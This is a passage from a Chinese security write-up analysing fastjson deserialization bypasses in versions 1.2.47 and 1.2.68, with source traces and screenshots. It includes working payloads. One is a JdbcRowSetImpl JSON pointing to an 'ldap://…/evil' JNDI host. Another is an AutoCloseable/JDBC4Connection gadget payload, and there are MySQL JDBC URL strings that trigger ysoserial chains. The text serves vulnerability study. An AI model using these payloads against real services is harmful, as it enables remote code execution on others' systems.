+<p>再看 deserializers ，位于 <code>com.alibaba.fastjson.parser.ParserConfig.deserializers</code> ，是一个 IdentityHashMap，能向其中赋值的函数有：</p>
+<ul>
+<li><code>getDeserializer()</code>：这个类用来加载一些特定类，以及有 <code>JSONType</code> 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。</li>
+<li><code>initDeserializers()</code>：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</li>
+<li><code>putDeserializer()</code>：被前两个函数调用，我们无法控制入参</li>
+</ul>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785498216643-773a8577-83a7-4832-a910-f0f7df1bab08.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785498276616-0dd6e3b4-5dd6-4e41-96f1-1159d87e8274.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785498468077-8a4cd98c-478f-48b4-b21d-65aa9d5ce95d.png"></p>
+<p>所以现在我们来看看<code>loadClass()</code>的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    <span class="keyword">if</span>(className == <span class="literal">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>))&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span>(contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先优先从本地缓存（<code>mappings</code>）中查找目标类；针对数组类型（<code>[</code> 开头）与 JVM 引用类型签名（<code>L...;</code> 格式）自动递归解析并还原类名；随后依次尝试通过<strong>传入的 ClassLoader</strong>、<strong>当前线程上下文 ClassLoader</strong> 以及 <code>**Class.forName**</code> 逐级加载目标类，并在加载成功后视配置将结果写入缓存</p>
+<p>也就是说只要我们能够控制这个方法的参数，就可以往 mappings 中写入任意类名</p>
+<p>那么咋控制？</p>
+<p>我们先来跟一个json</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;aaaaa\&quot;&#125;&quot;</span>, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>首先对json进行解析</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785500634805-66c1a4e4-e1ec-44a1-8144-0917c0877963.png"></p>
+<p>deserializers 在初始化时将 <code>Class.class</code> 进行了加载</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785500656434-ffc049f0-17b2-45a1-829a-0fcfdec584b8.png"></p>
+<p>调用 <code>checkAutoType()</code> 检查待加载类的合法性</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785500690513-804f9a8f-0da2-4f4e-a183-728b2b3f5592.png"></p>
+<p>deserializers 在初始化时将 <code>Class.class</code> 进行了加载，因此使用 findClass 可以找到</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785500773832-bf898d7b-7893-4eda-9803-09cb8c5a0cff.png"></p>
+<p>设置 resolveStatus 为 TypeNameRedirect</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785500880334-0250d5a1-d5bc-4cf2-8dfa-faa0e64c3f1a.png"></p>
+<p>根据不同的 class 类型分配 deserialzer，Class 类型由 <code>MiscCodec.deserialze()</code> 处理</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785500990796-5ca9fd2c-74f5-4e20-bfb9-3d6eac605899.png"></p>
+<p>将val值给<code>objVal</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785502290322-2bb6b020-d0a5-42b0-83c9-288347c51284.png"></p>
+<p>再传递给<code>strVal</code>后用<code>loadClass</code>加载</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785502361050-8c474559-b732-4df1-9495-03c51c296075.png"></p>
+<p>所以我们只需要将<code>{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;aaaaa&quot;}</code>这里的val值改成一个恶意类，恶意类就会被添加进入map中，当加载第二个json时就可以绕过黑名单</p>
+<p>payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;zimu0&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;zimu1&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:1234/evil&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson-1.2.68"></a>fastjson-1.2.68</h2><p>官方在 1.2.48 对漏洞进行了修复，在 <code>MiscCodec</code> 处理 Class 类的地方，设置了cache 为 false ，并且 <code>loadClass</code> 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785503025984-69986ac7-b4b0-4230-bb83-154298f61e54.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785503066591-f41ef178-7777-4656-a494-6c7a85b3495e.png"></p>
+<p>1.2.68新引入safeMode，配置safeMode为true,黑白名单均不支持autoType,默认为false,不影 响代码调用。经过源码分析，达到以下条件则可通过ParserConfig#checkAutoType()安全校验：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">expectClass为空：</span><br><span class="line">1. typeNmae不在denyHashCodes黑名单中（必须条件）</span><br><span class="line">2. SafeMode为false（必要条件，默认为false）</span><br><span class="line">3. typeName在TypeUtils#mappings中且expectClass为空且typeName不为HashMap且不为</span><br><span class="line">expectClass子类</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">expectClass不为空：</span><br><span class="line"><span class="number">1.</span> typeNmae和expectClass均不在denyHashCodes黑名单中（必须条件）</span><br><span class="line"><span class="number">2.</span> autoTypeSupport为<span class="literal">false</span>（默认为<span class="literal">false</span>）</span><br><span class="line"><span class="number">3.</span> expectClass在TypeUtils#mappings中</span><br><span class="line"><span class="number">4.</span> typeName不是ClassLoader、DataSource、RowSet的子类</span><br><span class="line"><span class="number">5.</span> expectClass不为<span class="literal">null</span>，且不为Object.class、Serializable.class、Cloneable.class、</span><br><span class="line">Closeable.class、EventListener.class、Iterable.class、Collection.class</span><br><span class="line"><span class="number">6.</span> typeName是expectClass的子类</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>具体分析可以去阅读对应版本<code>ParserConfig.java</code>中的代码，篇幅有限这里就不贴了</p>
+<p>如果你之前的几个版本跟过代码，一定会注意到这一段代码</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785568328213-4e942381-6f38-46ad-ac45-909ee90dc579.png"></p>
+<p>如果函数有 <code>expectClass</code> 入参，且我们传入的类名是 <code>expectClass</code> 的子类或实现，并且不在黑名单中，就可以通过 <code>checkAutoType()</code> 的安全检测</p>
+<p>所以我们的目标就是找<code>checkAutoType()</code> 的重载方法是否有可控的 <code>expectClass</code> 的入参方式，最终找到了以下几个类：</p>
+<ul>
+<li><code>ThrowableDeserializer#deserialze()</code></li>
+<li><code>JavaBeanDeserializer#deserialze()</code></li>
+</ul>
+<p><code>JavaBeanDeserializer</code>是默认反序列化器， <code>ThrowableDeserializer</code>为针对异常类的反序列化器  </p>
+<h3 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h3><p>其实内部运行逻辑没有太大区别，我们跟一下<code>JavaBeanDeserializer</code>的流程</p>
+<p>先用这个json来跟一下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hostToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;portToConnectTo&quot;</span><span class="punctuation">:</span> <span class="number">3306</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CommonsCollections5&quot;</span><span class="punctuation">,</span> <span class="comment">// 利用链</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pass&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;statementInterceptors&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;NUM_HOSTS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;databaseToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>跟到<code>DefaultJSONParser.java</code>中的<code>checkAutoType</code>入口</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785571801513-24bb7c4b-0a48-49cf-847c-a946429cee78.png"></p>
+<p>进去跟检查逻辑</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785571909829-f1a64636-1264-4b69-8a05-e246be84af51.png"></p>
+<p>会发现到clazz &#x3D; TypeUtils.getClassFromMapping(typeName) 时，clazz已经被赋值为java.lang.AutoCloseable</p>
+<p>这是因为 Fastjson 在加载 <code>TypeUtils</code> 类时，会在其静态代码块（<code>static</code> block）中预先注册一系列常见的 JDK 基础类型、包装类以及核心接口，以提高类型解析和反序列化时的性能</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785572009272-5471b421-6ca7-490a-aca7-fc5274ba5829.png"></p>
+<p>那这时我们已经满足了expectClass为空的条件，第一个@type 通过了检查</p>
+<p>接着运行到<code>ObjectDeserializer deserializer = config.getDeserializer(clazz);</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785572170869-1eb56ae1-ec56-4c1a-a37e-282cb2758e7b.png"></p>
+<p>然后调用 <code>ParserConfig#getDeserializer()</code>   根据typeName获取对应反序列化器  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785572231608-ca668e3a-3602-4ee3-a57d-60c7863c7505.png"></p>
+<p> 调用<code>return new JavaBeanDeserializer(this, clazz, type);</code> 创建<code>JavaBeanDeserializer</code> 对象 </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785572445480-69300852-1cc2-4ab5-9fd8-d2334d3e9e76.png"></p>
+<p>调用<code>JavaBeanDeserializer#deserialze()</code> 获取第二个<code>@type</code> 保存到<code>typeName</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785573055782-21989337-fded-4ebc-bd28-7043421d38de.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785573179729-4aa3e309-2c1b-4609-883b-89cf168e91d3.png"></p>
+<p>第一个<code>@type</code> 的值被作为<code>expectClass</code> 然后再次进入<code>checkAutoType</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785573263924-58a1ac42-330c-42aa-926b-e99d69aa1856.png"></p>
+<p>那么此时<code>typeName</code>为<code>com.mysql.jdbc.JDBC4Connection</code>，<code>expectClass</code>为<code>java.lang.AutoCloseable</code></p>
+<p>回顾一下通过的要求</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">expectClass不为空：</span><br><span class="line"><span class="number">1.</span> typeNmae和expectClass均不在denyHashCodes黑名单中（必须条件）</span><br><span class="line"><span class="number">2.</span> autoTypeSupport为<span class="literal"><span class="keyword">false</span></span>（默认为<span class="literal"><span class="keyword">false</span></span>）</span><br><span class="line"><span class="number">3.</span> expectClass在TypeUtils#mappings中</span><br><span class="line"><span class="number">4.</span> typeName不是ClassLoader、DataSource、RowSet的子类</span><br><span class="line"><span class="number">5.</span> expectClass不为<span class="literal"><span class="keyword">null</span></span>，且不为Object.class、Serializable.class、Cloneable.class、</span><br><span class="line">Closeable.class、EventListener.class、Iterable.class、Collection.class</span><br><span class="line"><span class="number">6.</span> typeName是expectClass的子类</span><br></pre></td></tr></table></figure>
+
+<p>这里最关键的地方 typeName得是expectClass的子类，那么事实的确如此</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.lang.AutoCloseable (Interface)</span><br><span class="line">   └── java.sql.Connection (Interface)</span><br><span class="line">         └── com.mysql.jdbc.Connection (Interface)</span><br><span class="line">               └── com.mysql.jdbc.ConnectionImpl (Class)</span><br><span class="line">                     └── com.mysql.jdbc.JDBC4Connection (Class)</span><br></pre></td></tr></table></figure>
+
+<p>所以最终会通过检查，完成反序列化，然后执行恶意的gadget</p>
+<h3 id="ThrowableDeserializer"><a href="#ThrowableDeserializer" class="headerlink" title="ThrowableDeserializer"></a>ThrowableDeserializer</h3><p>与之前调用链相同，到达<code>ThrowableDeserializer#deserialze()</code> 前，对第一个<code>@type</code>指定的类进行了 <code>ParserConfig#checkAutoType()</code>校验。若通过校验则进入到<code>ThrowableDeserializer#deserialze()</code>，词 法分析器将继续遍历JSON字符串剩余的部分，如果下一个仍为<code>@type</code>，则将第二个<code>@type</code>值作为将校验类名称<code>typeNmae</code>，<code>Throwable.class</code>作为期望类<code>expectClass</code>，一同传入 <code>ParserConfig#checkAutoType()</code>进行校验  </p>
+<p>故若需通过<code>ThrowableDeserializer</code>反序列化目标类，通过两次<code>checkAutoType()</code>校验，则需：</p>
+<ol>
+<li>第一个<code>@type</code>类为<code>Throwable</code>子类且在<code>TypeUtils#mappings</code>中</li>
+<li>第二个<code>@type</code>类为<code>Throwable</code>子类<br>因为<code>hrowable</code>不在<code>TypeUtils#mappings</code>中，故可使用<code>Throwable</code>子类<code>java.lang.Exception</code></li>
+</ol>
+<h3 id="JDBC链的分析"><a href="#JDBC链的分析" class="headerlink" title="JDBC链的分析"></a>JDBC链的分析</h3><p>分析完上面后执行恶意gadget的方法已经有了，那么如何去执行恶意的gadget？</p>
+<p>人们在JDBC中发现了一些可用的链子</p>
+<p><code>ServerStatusDiffInterceptor</code>链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">5.1.0-5.1.10：jdbc:mysql://127.0.0.1:3306/test?</span><br><span class="line">autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffI</span><br><span class="line">nterceptor&amp;user=yso_JRE8u20_calc 连接后需执行查询</span><br><span class="line"></span><br><span class="line">5.1.11-5.x.xx：jdbc:mysql://127.0.0.1:3306/test?</span><br><span class="line">autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffI</span><br><span class="line">nterceptor&amp;user=yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">6.x：jdbc:mysql://127.0.0.1:3306/test?</span><br><span class="line">autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDif</span><br><span class="line">fInterceptor&amp;user=yso_JRE8u20_calc （包名中添加cj）</span><br><span class="line"></span><br><span class="line">8.0.20以下：jdbc:mysql://127.0.0.1:3306/test?</span><br><span class="line">autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInte</span><br><span class="line">rceptor&amp;user=yso_JRE8u20_calc</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>detectCustomCollations</code>链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">5.1.19-5.1.28：jdbc:mysql://127.0.0.1:3306/test?</span><br><span class="line">autoDeserialize=true&amp;user=yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">5.1.29-5.1.40：jdbc:mysql://127.0.0.1:3306/test?</span><br><span class="line">detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">5.1.41 以上 不可用</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="ServerStatusDiffInterceptor链"><a href="#ServerStatusDiffInterceptor链" class="headerlink" title="ServerStatusDiffInterceptor链"></a>ServerStatusDiffInterceptor链</h4><p>我们先来分析一下上面调试的一个payload，它属于<code>ServerStatusDiffInterceptor</code>链</p>
+<p>JDBC 5.1.11-5.1.48版本可用</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hostToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;portToConnectTo&quot;</span><span class="punctuation">:</span> <span class="number">3306</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yso_CommonsCollections5_calc.exe&quot;</span><span class="punctuation">,</span> <span class="comment">// 利用链</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pass&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;statementInterceptors&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;NUM_HOSTS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;databaseToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>会先调用<code>com.mysql.jdbc.JDBC4Connection</code>的构造方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JDBC4Connection</span><span class="params">(String hostToConnectTo, <span class="type">int</span> portToConnectTo, Properties info, String databaseToConnectTo, String url)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="built_in">super</span>(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后调用如下代码</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785575638558-7037e11c-b772-494f-97d3-9724fff9d807.png"></p>
+<p>调用到<code>ConnectionImpl#connectOneTryOnly()  </code></p>
